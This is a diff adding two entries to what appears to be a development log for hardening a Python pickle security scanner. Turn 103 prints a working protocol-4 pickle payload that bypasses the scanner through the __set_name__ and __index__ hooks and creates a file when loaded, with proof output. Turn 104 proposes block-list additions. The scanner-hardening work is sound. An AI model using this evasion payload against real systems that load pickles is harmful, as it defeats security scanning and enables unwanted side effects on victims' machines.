@@ -5355,3 +5355,150 @@ Blocking plan:
 
 Performance note: four literals in the existing magic-method matcher, no
 numeric helper flow modeling or broad `math` blocklist additions.
+
+## Turn 103 - Descriptor `__set_name__` class-creation gap
+
+Candidate payload:
+
+- Create a runtime descriptor subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the descriptor base class so descriptor instances
+  are valid filesystem paths.
+- Install `pathlib.Path.touch` as the descriptor class's `__set_name__`
+  method.
+- Create a runtime metaclass with `__index__ = builtins.object.__sizeof__`.
+- Instantiate the descriptor with a marker path.
+- Create an owner class with that metaclass and the descriptor in its class
+  dictionary. `type`/metaclass class creation invokes
+  `descriptor.__set_name__(Owner, "x")`.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_descriptor_set_name_touch_index_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DescriptorPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__set_name__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("builtins", "type"),
+        b"(",
+        text("Meta"),
+        sg("builtins", "type"),
+        b"\x85",
+        b"}",
+        text("__index__"),
+        sg("builtins", "object.__sizeof__"),
+        b"s",
+        b"tR\x940",
+        b"h\x02",
+        b"(",
+        text("Owner"),
+        b")",
+        b"}",
+        text("x"),
+        b"h\x01",
+        b"s",
+        b"tR.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=246`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=264`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=264`, `bytes_total=264`,
+  `opcode_count=56`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `builtins.object.__sizeof__`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the owner-class creation returns a
+  `DescriptorPath` instance at
+  `/tmp/ma_descriptor_set_name_touch_index_marker` and does not create the
+  marker
+- Unpickle result: the full payload returns class `Owner` with metaclass
+  `Meta` and creates `/tmp/ma_descriptor_set_name_touch_index_marker` with
+  mode `0o610`
+
+RCE mechanism:
+
+- `type("DescriptorPath", (PosixPath,), {"__set_name__": Path.touch})`
+  creates a path-like descriptor class with attacker-controlled descriptor
+  setup behavior.
+- `type("Meta", (type,), {"__index__": object.__sizeof__})` creates a
+  metaclass whose class objects can be coerced to small integers through
+  `__index__`.
+- `Meta("Owner", (), {"x": descriptor})` creates an owner class. During class
+  creation, CPython calls `descriptor.__set_name__(Owner, "x")`.
+- Because `__set_name__` points at `Path.touch`, CPython calls
+  `Path.touch(descriptor, mode=Owner, exist_ok="x")`.
+- `Path.touch` coerces the `mode` argument with `Owner.__index__()`, which is
+  backed by clean `object.__sizeof__`, then creates the marker path and returns
+  normally. Class creation succeeds and the pickle load returns the new
+  `Owner` class.
+
+Why the scanner missed it:
+
+- Descriptor setup hook `__set_name__` is absent from the suspicious
+  magic-method string list.
+- Numeric coercion hook `__index__` is absent from the suspicious magic-method
+  string list, allowing the attacker to satisfy `Path.touch`'s integer `mode`
+  requirement through a synthetic metaclass.
+- `builtins.type` and `builtins.object.__sizeof__` are clean; `pathlib` is not
+  a wildcard-dangerous module.
+- The active dispatcher is ordinary class creation, not an imported helper such
+  as `property.__get__`, `inspect.getmembers`, or `builtins.getattr`, so the
+  existing descriptor-method blocks do not fire.
+
+Performance note: the focused next block should add `__set_name__` and
+`__index__` to the suspicious magic-method string list. That costs two
+literals in the existing matcher and avoids broad blocking of `builtins.type`,
+`object.__sizeof__`, or benign descriptor construction.
+
+## Turn 104 - Block descriptor setup and index coercion seeds
+
+Blocking plan:
+
+- Add `__set_name__` and `__index__` to the existing suspicious magic-method
+  string list. `__set_name__` can execute during ordinary class creation, and
+  `__index__` can make otherwise incompatible objects satisfy integer
+  arguments after dispatch.
+- Leave `builtins.type`, `builtins.object.__sizeof__`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch` allowed for this focused block. The static signal is the
+  attacker-controlled descriptor setup and numeric coercion hook names.
+- Add a CPython oracle regression for the Turn 103 payload. The regression
+  verifies the construction-only descriptor/metaclass control is suspicious and
+  side-effect free, then verifies owner-class creation is suspicious and still
+  creates its marker during `pickle.loads()` while returning the new `Owner`
+  class.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: two literals in the existing magic-method matcher, no class
+creation or descriptor flow modeling.
